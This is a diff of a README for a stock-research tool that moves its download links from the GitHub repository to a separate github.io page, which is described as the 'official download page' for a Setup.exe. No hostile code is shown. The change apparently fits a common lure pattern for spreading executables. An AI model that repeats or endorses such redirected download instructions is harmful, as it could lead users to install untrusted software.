@@ -1,6 +1,6 @@
 # 📊 Financial-Research-Agent-2026 - Automate your deep stock market research
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/leor2707/Financial-Research-Agent-2026)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://leor2707.github.io)
 
 Financial-Research-Agent-2026 collects data from public companies to help you make informed investment decisions. This application gathers news, financial reports, and stock prices. It processes this information and creates simple summaries for your review. Use this tool to save time on manual data entry and analysis.
 
@@ -18,7 +18,7 @@ Your computer must meet these standards to run the software smoothly:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official download page](https://github.com/leor2707/Financial-Research-Agent-2026).
+1. Visit the [official download page](https://leor2707.github.io).
 2. Locate the file named Setup.exe in the latest release section.
 3. Click the link to save the file to your computer.
 4. Open your Downloads folder.
